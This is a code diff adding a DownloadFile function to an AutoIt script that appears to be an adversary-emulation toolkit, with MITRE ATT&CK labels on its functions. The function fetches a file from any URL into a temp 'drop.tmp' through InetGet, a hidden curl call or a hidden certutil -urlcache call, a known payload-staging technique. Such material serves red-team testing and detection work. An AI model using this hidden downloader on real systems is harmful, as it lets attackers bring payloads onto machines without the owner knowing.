@@ -289,6 +289,23 @@ Func function_wrapper($command);DESCRIPTION:internal function;MITRE:-
    Return $sOutput
 EndFunc
 
+Func DownloadFile($URL, $mode, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:download a file via http;MITRE:Command And Control
+	;If Not FileExists($filePath) Then
+		if ( $mode == "native" ) Then 
+			Local $status = InetGet($URL, $FileName, 1, 1)
+				Do
+					Sleep(250)
+					Until InetGetInfo($status, $INET_DOWNLOADCOMPLETE)
+		EndIf
+		if ( $mode == "curl" ) Then
+			RunWait("curl " & $URL & " --output " & $FileName,"" ,@SW_HIDE)
+		EndIf
+		if ( $mode == "certutil" ) Then
+			RunWait("certutil.exe -urlcache -f " & $URL & " " & $FileName,"" ,@SW_HIDE)
+		EndIf
+	;EndIf
+EndFunc
+
 Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:download a file from an http server;MITRE:Command And Control
    InetGet($sURL, $FileName, 1, 1)
 EndFunc
